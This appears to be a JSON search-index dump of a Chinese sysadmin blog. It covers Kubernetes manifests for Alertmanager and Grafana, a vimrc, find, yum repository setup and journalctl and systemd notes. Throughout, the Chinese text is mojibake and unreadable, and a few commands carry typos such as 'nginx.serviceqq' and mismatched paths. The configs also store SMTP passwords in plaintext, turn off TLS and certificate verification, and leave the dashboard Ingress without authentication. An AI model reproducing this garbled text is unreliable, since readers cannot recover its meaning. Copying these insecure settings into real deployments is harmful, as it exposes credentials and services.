å‘Šè­¦ä¸»æœº: {{ .Labels.instance }} å‘Šè­¦ä¿¡æ¯: {{ index .Annotations \"description\" }} ç»´æŠ¤å›¢é˜Ÿ: {{ .Labels.team | toUpper }} å‘Šè­¦æ—¶é—´: {{ .StartsAt.Format \"2006-01-02 15:04:05\" }} æ¢å¤æ—¶é—´: {{ .EndsAt.Format \"2006-01-02 15:04:05\" }} ------------------------------ {{ end -}}{{ end }} {{ define \"wechat.tmpl\" }} {{- if gt (len .Alerts.Firing) 0 -}} ====ä¾¦æµ‹åˆ°{{ .Alerts.Firing | len }}ä¸ªæ•…éšœ==== {{ template \"__alert_list\" .Alerts.Firing }} {{ end -}} {{- if gt (len .Alerts.Resolved) 0 -}} ====æ¢å¤{{ .Alerts.Resolved | len }}ä¸ªæ•…éšœ==== {{ template \"__resolved_list\" .Alerts.Resolved }} {{- end -}} {{ end }} config.yml: |- templates: - '/etc/alertmanager/*.tmpl' global: # åœ¨æ²¡æœ‰æŠ¥è­¦çš„æƒ…å†µä¸‹å£°æ˜ä¸ºå·²è§£å†³çš„æ—¶é—´ resolve_timeout: 5m # é…ç½®é‚®ä»¶å‘é€ä¿¡æ¯ smtp_smarthost: 'smtp.qq.com:465' smtp_from: '742899387@qq.com' smtp_auth_username: '742899387@qq.com' smtp_auth_password: '123123123' smtp_require_tls: false # æ‰€æœ‰æŠ¥è­¦ä¿¡æ¯è¿›å…¥åçš„æ ¹è·¯ç”±ï¼Œç”¨æ¥è®¾ç½®æŠ¥è­¦çš„åˆ†å‘ç­–ç•¥ route: # è¿™é‡Œçš„æ ‡ç­¾åˆ—è¡¨æ˜¯æ¥æ”¶åˆ°æŠ¥è­¦ä¿¡æ¯åçš„é‡æ–°åˆ†ç»„æ ‡ç­¾ï¼Œä¾‹å¦‚ï¼Œæ¥æ”¶åˆ°çš„æŠ¥è­¦ä¿¡æ¯é‡Œé¢æœ‰è®¸å¤šå…·æœ‰ cluster=A å’Œ alertname=LatncyHigh è¿™æ ·çš„æ ‡ç­¾çš„æŠ¥è­¦ä¿¡æ¯å°†ä¼šæ‰¹é‡è¢«èšåˆåˆ°ä¸€ä¸ªåˆ†ç»„é‡Œé¢ group_by: ['alertname', 'cluster'] # å½“ä¸€ä¸ªæ–°çš„æŠ¥è­¦åˆ†ç»„è¢«åˆ›å»ºåï¼Œéœ€è¦ç­‰å¾…è‡³å°‘group_waitæ—¶é—´æ¥åˆå§‹åŒ–é€šçŸ¥ï¼Œè¿™ç§æ–¹å¼å¯ä»¥ç¡®ä¿æ‚¨èƒ½æœ‰è¶³å¤Ÿçš„æ—¶é—´ä¸ºåŒä¸€åˆ†ç»„æ¥è·å–å¤šä¸ªè­¦æŠ¥ï¼Œç„¶åä¸€èµ·è§¦å‘è¿™ä¸ªæŠ¥è­¦ä¿¡æ¯ã€‚ group_wait: 10s # å½“ç¬¬ä¸€ä¸ªæŠ¥è­¦å‘é€åï¼Œç­‰å¾…'group_interval'æ—¶é—´æ¥å‘é€æ–°çš„ä¸€ç»„æŠ¥è­¦ä¿¡æ¯ã€‚ group_interval: 1m # æ¯30åˆ†é’Ÿå‘é€ä¸€æ¬¡æŠ¥è­¦,ç›´è‡³æ¢å¤ä¸ºæ­¢ repeat_interval: 30m # é»˜è®¤çš„receiverï¼šå¦‚æœä¸€ä¸ªæŠ¥è­¦æ²¡æœ‰è¢«ä¸€ä¸ªrouteåŒ¹é…ï¼Œåˆ™å‘é€ç»™é»˜è®¤çš„æ¥æ”¶å™¨ receiver: default # ä¸Šé¢æ‰€æœ‰çš„å±æ€§éƒ½ç”±æ‰€æœ‰å­è·¯ç”±ç»§æ‰¿ï¼Œå¹¶ä¸”å¯ä»¥åœ¨æ¯ä¸ªå­è·¯ç”±ä¸Šè¿›è¡Œè¦†ç›–ã€‚ routes: # å‘Šè­¦è§„åˆ™ä¸­æ ‡ç­¾å«æœ‰filesystem=nodeçš„æŠ¥è­¦ä¼šé€šè¿‡webhookæ¥æ”¶å™¨å‘é€ - receiver: dingtalk match: severity: critical # - receiver: email # group_wait: 10s # match: # team: node receivers: - name: 'default' email_configs: - to: '742899387@qq.com' send_resolved: true - name: 'dingtalk' webhook_configs: - url: 'http://prometheus-webhook-dingtalk.kube-ops.svc.cluster.local:8060/dingtalk/webhook_mention_users/send' send_resolved: true # - name: 'wechat' # wechat_configs: # - send_resolved: true # api_secret: '' # corp_id: '' # agent_id: '' # to_party: '' # message: '{{ template \"wechat.tmpl\" . }}' kind: Deployment apiVersion: extensions/v1beta1 metadata: name: alertmanager namespace: kube-ops labels: app: alertmanager spec: template: metadata: name: alertmanager labels: app: alertmanager spec: containers: - name: alertmanager image: prom/alertmanager:v0.21.0 args: - \"--config.file=/etc/alertmanager/config.yml\" - \"--storage.path=/alertmanager/data\" #- \"--log.level=debug\" ports: - name: http containerPort: 9093 volumeMounts: - name: conf mountPath: /etc/alertmanager/ resources: requests: cpu: 100m memory: 256Mi limits: cpu: 100m memory: 256Mi volumes: - name: conf configMap: name: alert-config --- kind: Service apiVersion: v1 metadata: name: alertmanager namespace: kube-ops spec: type: ClusterIP ports: - name: alertmanager port: 9093 targetPort: http selector: app: alertmanager --- apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: alertmanager namespace: kube-ops annotations: kubernetes.io/ingress.class: \"nginx\" #nginx.ingress.kubernetes.io/auth-type: basic #nginx.ingress.kubernetes.io/auth-secret: alertmanager-basic-auth spec: rules: - host: alert.soulchild.cn http: paths: - path: / backend: serviceName: alertmanager servicePort: http ","date":"2020-08-26 10:53","objectID":"/post/1933/:2:0","tags":["k8s","prometheus"],"title":"k8séƒ¨ç½²prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["ç›‘æ§","kubernetes"],"content":"ä¸‰ã€grafana ","date":"2020-08-26 10:53","objectID":"/post/1933/:3:0","tags":["k8s","prometheus"],"title":"k8séƒ¨ç½²prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["ç›‘æ§","kubernetes"],"content":"1.åˆ›å»ºpvã€pvc --- apiVersion: v1 kind: PersistentVolume metadata: name: grafana spec: nfs: path: /nfsdata/ server: 10.0.0.10 capacity: storage: 1Gi accessModes: [ReadWriteOnce] persistentVolumeReclaimPolicy: Retain --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: grafana namespace: kube-ops spec: accessModes: [ReadWriteOnce] resources: requests: storage: 1Gi ","date":"2020-08-26 10:53","objectID":"/post/1933/:3:1","tags":["k8s","prometheus"],"title":"k8séƒ¨ç½²prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["ç›‘æ§","kubernetes"],"content":"2.åˆ›å»ºconfigmap apiVersion: v1 kind: ConfigMap metadata: name: grafana-conf namespace: kube-ops data: grafana.ini: | [server] protocol = http # è®¿é—®åè®®ï¼Œé»˜è®¤http http_port = 3000 # ç›‘å¬çš„ç«¯å£ï¼Œé»˜è®¤æ˜¯3000 root_url = http://1.3.4.1:30003 # è¿™æ˜¯ä¸€ä¸ªwebä¸Šè®¿é—®grafanaçš„å…¨è·¯å¾„urlï¼Œé»˜è®¤æ˜¯%(protocol)s://%(domain)s:%(http_port)s/ router_logging = false # æ˜¯å¦è®°å½•webè¯·æ±‚æ—¥å¿—ï¼Œé»˜è®¤æ˜¯false enable_gzip = true [smtp] enabled = true host = smtp.exmail.qq.com:587 user = 742899387@qq.com password = aaa skip_verify = true from_address = 742899387@qq.com from_name = Grafana [alerting] enable = true execute_alerts = true ","date":"2020-08-26 10:53","objectID":"/post/1933/:3:2","tags":["k8s","prometheus"],"title":"k8séƒ¨ç½²prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["ç›‘æ§","kubernetes"],"content":"3.åˆ›å»ºdeployment apiVersion: extensions/v1beta1 kind: Deployment metadata: name: grafana namespace: kube-ops labels: app: grafana spec: revisionHistoryLimit: 5 template: metadata: labels: app: grafana spec: containers: - name: grafana image: grafana/grafana:6.7.1 imagePullPolicy: IfNotPresent securityContext: runAsUser: 472 runAsGroup: 472 ports: - name: web containerPort: 3000 protocol: TCP resources: requests: cpu: 100m memory: 512Mi limits: cpu: 100m memory: 512Mi readinessProbe: initialDelaySeconds: 5 periodSeconds: 30 successThreshold: 1 failureThreshold: 5 timeoutSeconds: 10 httpGet: path: /api/health port: 3000 scheme: HTTP livenessProbe: failureThreshold: 5 successThreshold: 1 timeoutSeconds: 10 periodSeconds: 30 httpGet: path: /api/health port: 3000 scheme: HTTP volumeMounts: - name: config mountPath: /etc/grafana - name: data mountPath: /var/lib/grafana/ subPath: grafana initContainers: - name: change-dir image: busybox command: [\"chown\",\"-R\",\"472.472\",\"/var/lib/grafana\"] volumeMounts: - mountPath: /var/lib/grafana/ subPath: grafana name: data volumes: - name: config configMap: name: grafana-conf - name: data persistentVolumeClaim: claimName: grafana ","date":"2020-08-26 10:53","objectID":"/post/1933/:3:3","tags":["k8s","prometheus"],"title":"k8séƒ¨ç½²prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["ç›‘æ§","kubernetes"],"content":"4.åˆ›å»ºservice apiVersion: v1 kind: Service metadata: name: grafana namespace: kube-ops spec: type: NodePort selector: app: grafana ports: - port: 3000 targetPort: web nodePort: 30003 ","date":"2020-08-26 10:53","objectID":"/post/1933/:3:4","tags":["k8s","prometheus"],"title":"k8séƒ¨ç½²prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["docker"],"content":"ä½¿ç”¨aspose.word è½¬æ¢pdfä¸­æ–‡ä¹±ç  Dockerfile FROM openjdk:8u212-jdk-alpine RUN mkdir /usr/share/fonts COPY fonts/ /usr/share/fonts RUN apk add mkfontscale mkfontdir \u0026\u0026 cd /usr/share/fonts;mkfontscale \u0026\u0026 cd /usr/share/fonts;mkfontdir;rm -fr /var/cache/apk/* ","date":"2020-08-24 17:50","objectID":"/post/1930/:0:0","tags":["docker"],"title":"å®¹å™¨ä¸­æ–‡å­—ä½“é—®é¢˜,ä½¿ç”¨aspose.wordè½¬æ¢pdfä¸­æ–‡ä¹±ç ","uri":"/post/1930/"},{"categories":["å…¶ä»–"],"content":"æ•ˆæœ 16136-rtytmf4ycw.png ä¸‹è½½é…è‰² mkdir $HOME/.vim/colors wget https://raw.githubusercontent.com/tomasr/molokai/master/colors/molokai.vim -O $HOME/.vim/colors/molokai.vim 2.ä¿®æ”¹vimrc vim $HOME/.vimrc \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" =\u003e General \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" Sets how many lines of history VIM has to remember \" \"set history=500 set cursorcolumn \" display numbers set nu \"visual edit everywhere \"\"set virtualedit=all \"show command set showcmd set cmdheight=2 set scrolloff=3 \" Enable filetype plugins filetype plugin on filetype indent on \" Set to auto read when a file is changed from the outside set autoread set nocompatible \" Search set ignorecase \" Ignore case when searching set smartcase \" When searching try to be smart about cases set hlsearch \" Highlight search results set incsearch \" Makes search act like search in modern browsers \" Don't redraw while executing macros (good performance config) set lazyredraw \" For regular expressions turn magic on set magic \" Show matching brackets when text indicator is over them set showmatch \" How many tenths of a second to blink when matching brackets set mat=2 \" No annoying sound on errors set noerrorbells \"set novisualbell set t_vb= set tm=500 \" Add a bit extra margin to the left set foldcolumn=1 set fdm=marker \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" =\u003e Colors and Fonts \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" Enable syntax highlighting syntax enable colorscheme molokai \"colorscheme monokai \"colorscheme murphy \"colorscheme solarized \"let g:solarized_termcolors=256 \"let g:solarized_contrast=\"high\" \"default value is normal set t_Co=256 \"set vim terminal color set background=dark \"set guifont=Mono\\ 13 set guifont=monaco\\ 14 \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" =\u003e Statusline setting \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" set statusline=%1*\\ [%{Disp_Mode()}]\\ %*\\ %-5.58(%F%m%r%h%w%)\\ %2*\\ %-5.58(CWD:\\ %{getcwd()}%)\\ %*\\ Format:\\ [%{\u0026fenc!=''?\u0026fenc:\u0026enc}]\\ %3*\\ FileType:\\ %y\\ %*\\ %([L:\\ %l,C:\\ %c][%p%%]%)%\u003c hi User1 guibg=slateblue guifg=Gray ctermfg=Gray ctermbg=93 hi User2 guibg=#4876FF guifg=Gray ctermfg=Gray ctermbg=53 hi User3 guibg=Brown guifg=Gray ctermfg=Gray ctermbg=160 hi StatusLine guibg=#cccccc guifg=#222222 set laststatus=2 \"2:always display \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" =\u003e file coding and decoding \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" Set utf8 as standard encoding and en_US as the standard language set termencoding=utf-8 set encoding=utf8 set fileencodings=ucs-bom,utf-8,cp936,gb18030,big5,latin1 \"decoding list set fileencoding=utf-8 \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" =\u003e Files, backups and undo \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" Turn backup off, since most stuff is in SVN, git et.c anyway... set nobackup set nowb set noswapfile \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" =\u003e Text, tab and indent related \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" 1 tab == 4 spaces set shiftwidth=4 set tabstop=4 set softtabstop=4 \" Use spaces instead of tabs set expandtab \" Be smart when using tabs set smarttab \"toggle paste mode with hitting F2 key set pastetoggle=\u003cF2\u003e \"set paste \"open paste mode set ai \"Auto indent set si \"Smart indent \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" Wrap and breakline setting \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" Linebreak on 500 characters set lbr \"linebreak set tw=500 \"break at 500 words set showbreak==\u003e\\ \"show \"=\u003e\" before the break line set wrap \"Wrap lines \"configure backspace set backspace=eol,start,indent set whichwrap+=\u003c,\u003e,h,l \" Highlight the current line set cursorline \"highlight CursorLine guibg=#003853 ctermbg=24 gui=none cterm=none \"set clipboard=unnamed \"yank u","date":"2020-08-24 16:01","objectID":"/post/2639/:0:0","tags":["vim"],"title":"vimé…ç½®æ–¹æ¡ˆ","uri":"/post/2639/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"-newerXYå‚æ•°ï¼šXå’ŒYå‡ä¸ºå˜é‡ã€‚å…¶ä¸­XæŒ‡findçš„ç›®æ ‡æ–‡ä»¶å±æ€§ï¼ŒYä»£è¡¨å‚ç…§å±æ€§ã€‚ aï¼šè®¿é—®æ—¶é—´ mï¼šæ–‡ä»¶ä¿®æ”¹æ—¶é—´ cï¼šinodeæ›´æ”¹æ—¶é—´ tï¼šè‡ªå®šä¹‰æ—¶é—´(æ ¼å¼:yyyy-MM-dd hh:mm:ss) æŸ¥æ‰¾åˆ°çš„æ–‡ä»¶ä¸­ï¼Œmtimeçš„æ—¶é—´å¤§äº2020-08-21çš„æ–‡ä»¶ã€‚ å³ï¼š2020-08-21ä¹‹åçš„æ–‡ä»¶ find ./ -type f -newermt '2020-08-21' æŸ¥æ‰¾åˆ°çš„æ–‡ä»¶ä¸­ï¼Œmtimeçš„æ—¶é—´å°äº2020-08-21çš„æ–‡ä»¶ã€‚ å³ï¼š2020-08-21ä¹‹å‰çš„æ–‡ä»¶ find ./ -type f ! -newermt '2020-08-21' æŸ¥æ‰¾åˆ°çš„æ–‡ä»¶ä¸­ï¼Œmtimeçš„æ—¶é—´å¤§äº2020-08-17çš„æ–‡ä»¶ï¼Œå°äº2020-08-21çš„æ–‡ä»¶ã€‚ å³ï¼š2020-08-17åˆ°2020-08-21ä¹‹é—´çš„æ–‡ä»¶ find ./ -type f -newermt '2020-08-17' ! -newermt '2020-08-21' ","date":"2020-08-24 08:54","objectID":"/post/1927/:0:0","tags":[],"title":"findæ ¹æ®æ—¶é—´å±æ€§æŸ¥æ‰¾æ–‡ä»¶","uri":"/post/1927/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1.å‡†å¤‡æœ¬åœ°ä»“åº“ï¼š mkdir devtools yum groupinstall \"Development tools\" --downloadonly --downloaddir=./dev/tools yum install -y createrepo cd devtools createrepo ./ 2.é…ç½®nginxï¼š server{ server_name _; listen 8; root /var/www/devtools; autoindex on; } æ‰¾ä¸€å°æœºå™¨é…ç½®æµ‹è¯•ä¸€ä¸‹ï¼š é…ç½®yumæº vim /etc/yum.repos.d/devtools.repo [base] name=CentOS-$releasever - Base baseurl=http://192.168.56.223/ gpgcheck=1 gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7 å®‰è£…æµ‹è¯• yum install -y unzip ","date":"2020-08-19 16:23","objectID":"/post/1925/:0:0","tags":["yum"],"title":"åˆ¶ä½œä¸€ä¸ªyumæº","uri":"/post/1925/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸¤ç§æ–¹å¼ï¼š æ–¹æ³•1: yum install -y --downloadonly --downloaddir=/tmp/jq jq æ–¹æ³•2: yum install -y yum-utils yumdownloader --destdir=/tmp/jq --resolve jq ","date":"2020-08-19 16:06","objectID":"/post/1924/:0:0","tags":["yum"],"title":"yumåªä¸‹è½½ä¸å®‰è£…","uri":"/post/1924/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"åŸæ–‡è¿æ¥ï¼šhttp://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html Systemd ç»Ÿä¸€ç®¡ç†æ‰€æœ‰ Unit çš„å¯åŠ¨æ—¥å¿—ã€‚å¸¦æ¥çš„å¥½å¤„å°±æ˜¯ï¼Œå¯ä»¥åªç”¨journalctlä¸€ä¸ªå‘½ä»¤ï¼ŒæŸ¥çœ‹æ‰€æœ‰æ—¥å¿—ï¼ˆå†…æ ¸æ—¥å¿—å’Œåº”ç”¨æ—¥å¿—ï¼‰ã€‚æ—¥å¿—çš„é…ç½®æ–‡ä»¶æ˜¯/etc/systemd/journald.confã€‚ # æŸ¥çœ‹æ‰€æœ‰æ—¥å¿—ï¼ˆé»˜è®¤æƒ…å†µä¸‹ ï¼Œåªä¿å­˜æœ¬æ¬¡å¯åŠ¨çš„æ—¥å¿—ï¼‰ $ sudo journalctl # æŸ¥çœ‹å†…æ ¸æ—¥å¿—ï¼ˆä¸æ˜¾ç¤ºåº”ç”¨æ—¥å¿—ï¼‰ $ sudo journalctl -k # æŸ¥çœ‹ç³»ç»Ÿæœ¬æ¬¡å¯åŠ¨çš„æ—¥å¿— $ sudo journalctl -b $ sudo journalctl -b -0 # æŸ¥çœ‹ä¸Šä¸€æ¬¡å¯åŠ¨çš„æ—¥å¿—ï¼ˆéœ€æ›´æ”¹è®¾ç½®ï¼‰ $ sudo journalctl -b -1 # æŸ¥çœ‹æŒ‡å®šæ—¶é—´çš„æ—¥å¿— $ sudo journalctl --since=\"2012-10-30 18:17:16\" $ sudo journalctl --since \"20 min ago\" $ sudo journalctl --since yesterday $ sudo journalctl --since \"2015-01-10\" --until \"2015-01-11 03:00\" $ sudo journalctl --since 09:00 --until \"1 hour ago\" # æ˜¾ç¤ºå°¾éƒ¨çš„æœ€æ–°10è¡Œæ—¥å¿— $ sudo journalctl -n # æ˜¾ç¤ºå°¾éƒ¨æŒ‡å®šè¡Œæ•°çš„æ—¥å¿— $ sudo journalctl -n 20 # å®æ—¶æ»šåŠ¨æ˜¾ç¤ºæœ€æ–°æ—¥å¿— $ sudo journalctl -f # æŸ¥çœ‹æŒ‡å®šæœåŠ¡çš„æ—¥å¿— $ sudo journalctl /usr/lib/systemd/systemd # æŸ¥çœ‹æŒ‡å®šè¿›ç¨‹çš„æ—¥å¿— $ sudo journalctl _PID=1 # æŸ¥çœ‹æŸä¸ªè·¯å¾„çš„è„šæœ¬çš„æ—¥å¿— $ sudo journalctl /usr/bin/bash # æŸ¥çœ‹æŒ‡å®šç”¨æˆ·çš„æ—¥å¿— $ sudo journalctl _UID=33 --since today # æŸ¥çœ‹æŸä¸ª Unit çš„æ—¥å¿— $ sudo journalctl -u nginx.service $ sudo journalctl -u nginx.service --since today # å®æ—¶æ»šåŠ¨æ˜¾ç¤ºæŸä¸ª Unit çš„æœ€æ–°æ—¥å¿— $ sudo journalctl -u nginx.service -f # åˆå¹¶æ˜¾ç¤ºå¤šä¸ª Unit çš„æ—¥å¿— $ journalctl -u nginx.service -u php-fpm.service --since today # æŸ¥çœ‹æŒ‡å®šä¼˜å…ˆçº§ï¼ˆåŠå…¶ä»¥ä¸Šçº§åˆ«ï¼‰çš„æ—¥å¿—ï¼Œå…±æœ‰8çº§ # 0: emerg # 1: alert # 2: crit # 3: err # 4: warning # 5: notice # 6: info # 7: debug $ sudo journalctl -p err -b # æ—¥å¿—é»˜è®¤åˆ†é¡µè¾“å‡ºï¼Œ--no-pager æ”¹ä¸ºæ­£å¸¸çš„æ ‡å‡†è¾“å‡º $ sudo journalctl --no-pager # ä»¥ JSON æ ¼å¼ï¼ˆå•è¡Œï¼‰è¾“å‡º $ sudo journalctl -b -u nginx.service -o json # ä»¥ JSON æ ¼å¼ï¼ˆå¤šè¡Œï¼‰è¾“å‡ºï¼Œå¯è¯»æ€§æ›´å¥½ $ sudo journalctl -b -u nginx.serviceqq -o json-pretty # æ˜¾ç¤ºæ—¥å¿—å æ®çš„ç¡¬ç›˜ç©ºé—´ $ sudo journalctl --disk-usage # æŒ‡å®šæ—¥å¿—æ–‡ä»¶å æ®çš„æœ€å¤§ç©ºé—´ $ sudo journalctl --vacuum-size=1G # æŒ‡å®šæ—¥å¿—æ–‡ä»¶ä¿å­˜å¤šä¹… $ sudo journalctl --vacuum-time=1years ","date":"2020-08-19 10:04","objectID":"/post/1922/:0:0","tags":["systemd"],"title":"systemd-æ—¥å¿—ç®¡ç†","uri":"/post/1922/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"åŸæ–‡é“¾æ¥ï¼šhttp://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html ","date":"2020-08-19 09:58","objectID":"/post/1921/:0:0","tags":["systemd"],"title":"systemdç®¡ç†æœåŠ¡--é…ç½®æ–‡ä»¶çš„å«ä¹‰","uri":"/post/1921/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"é…ç½®æ–‡ä»¶çš„åŒºå— [Unit]åŒºå—é€šå¸¸æ˜¯é…ç½®æ–‡ä»¶çš„ç¬¬ä¸€ä¸ªåŒºå—ï¼Œç”¨æ¥å®šä¹‰ Unit çš„å…ƒæ•°æ®ï¼Œä»¥åŠé…ç½®ä¸å…¶ä»– Unit çš„å…³ç³»ã€‚å®ƒçš„ä¸»è¦å­—æ®µå¦‚ä¸‹ã€‚ Descriptionï¼šç®€çŸ­æè¿° Documentationï¼šæ–‡æ¡£åœ°å€ Requiresï¼šå½“å‰ Unit ä¾èµ–çš„å…¶ä»– Unitï¼Œå¦‚æœå®ƒä»¬æ²¡æœ‰è¿è¡Œï¼Œå½“å‰ Unit ä¼šå¯åŠ¨å¤±è´¥ Wantsï¼šä¸å½“å‰ Unit é…åˆçš„å…¶ä»– Unitï¼Œå¦‚æœå®ƒä»¬æ²¡æœ‰è¿è¡Œï¼Œå½“å‰ Unit ä¸ä¼šå¯åŠ¨å¤±è´¥ BindsToï¼šä¸Requiresç±»ä¼¼ï¼Œå®ƒæŒ‡å®šçš„ Unit å¦‚æœé€€å‡ºï¼Œä¼šå¯¼è‡´å½“å‰ Unit åœæ­¢è¿è¡Œ Beforeï¼šå¦‚æœè¯¥å­—æ®µæŒ‡å®šçš„ Unit ä¹Ÿè¦å¯åŠ¨ï¼Œé‚£ä¹ˆå¿…é¡»åœ¨å½“å‰ Unit ä¹‹åå¯åŠ¨ Afterï¼šå¦‚æœè¯¥å­—æ®µæŒ‡å®šçš„ Unit ä¹Ÿè¦å¯åŠ¨ï¼Œé‚£ä¹ˆå¿…é¡»åœ¨å½“å‰ Unit ä¹‹å‰å¯åŠ¨ Conflictsï¼šè¿™é‡ŒæŒ‡å®šçš„ Unit ä¸èƒ½ä¸å½“å‰ Unit åŒæ—¶è¿è¡Œ Conditionâ€¦ï¼šå½“å‰ Unit è¿è¡Œå¿…é¡»æ»¡è¶³çš„æ¡ä»¶ï¼Œå¦åˆ™ä¸ä¼šè¿è¡Œ Assertâ€¦ï¼šå½“å‰ Unit è¿è¡Œå¿…é¡»æ»¡è¶³çš„æ¡ä»¶ï¼Œå¦åˆ™ä¼šæŠ¥å¯åŠ¨å¤±è´¥ [Install]é€šå¸¸æ˜¯é…ç½®æ–‡ä»¶çš„æœ€åä¸€ä¸ªåŒºå—ï¼Œç”¨æ¥å®šä¹‰å¦‚ä½•å¯åŠ¨ï¼Œä»¥åŠæ˜¯å¦å¼€æœºå¯åŠ¨ã€‚å®ƒçš„ä¸»è¦å­—æ®µå¦‚ä¸‹ã€‚ WantedByï¼šå®ƒçš„å€¼æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ª Targetï¼Œå½“å‰ Unit æ¿€æ´»æ—¶ï¼ˆenableï¼‰ç¬¦å·é“¾æ¥ä¼šæ”¾å…¥/etc/systemd/systemç›®å½•ä¸‹é¢ä»¥ Target å + .wantsåç¼€æ„æˆçš„å­ç›®å½•ä¸­ RequiredByï¼šå®ƒçš„å€¼æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ª Targetï¼Œå½“å‰ Unit æ¿€æ´»æ—¶ï¼Œç¬¦å·é“¾æ¥ä¼šæ”¾å…¥/etc/systemd/systemç›®å½•ä¸‹é¢ä»¥ Target å + .requiredåç¼€æ„æˆçš„å­ç›®å½•ä¸­ Aliasï¼šå½“å‰ Unit å¯ç”¨äºå¯åŠ¨çš„åˆ«å Alsoï¼šå½“å‰ Unit æ¿€æ´»ï¼ˆenableï¼‰æ—¶ï¼Œä¼šè¢«åŒæ—¶æ¿€æ´»çš„å…¶ä»– Unit [Service]åŒºå—ç”¨æ¥ Service çš„é…ç½®ï¼Œåªæœ‰ Service ç±»å‹çš„ Unit æ‰æœ‰è¿™ä¸ªåŒºå—ã€‚å®ƒçš„ä¸»è¦å­—æ®µå¦‚ä¸‹ã€‚ Typeï¼šå®šä¹‰å¯åŠ¨æ—¶çš„è¿›ç¨‹è¡Œä¸ºã€‚å®ƒæœ‰ä»¥ä¸‹å‡ ç§å€¼ã€‚ Type=simpleï¼šé»˜è®¤å€¼ï¼Œæ‰§è¡ŒExecStartæŒ‡å®šçš„å‘½ä»¤ï¼Œå¯åŠ¨ä¸»è¿›ç¨‹ Type=forkingï¼šä»¥ fork æ–¹å¼ä»çˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹ï¼Œåˆ›å»ºåçˆ¶è¿›ç¨‹ä¼šç«‹å³é€€å‡º Type=oneshotï¼šä¸€æ¬¡æ€§è¿›ç¨‹ï¼ŒSystemd ä¼šç­‰å½“å‰æœåŠ¡é€€å‡ºï¼Œå†ç»§ç»­å¾€ä¸‹æ‰§è¡Œ Type=dbusï¼šå½“å‰æœåŠ¡é€šè¿‡D-Buså¯åŠ¨ 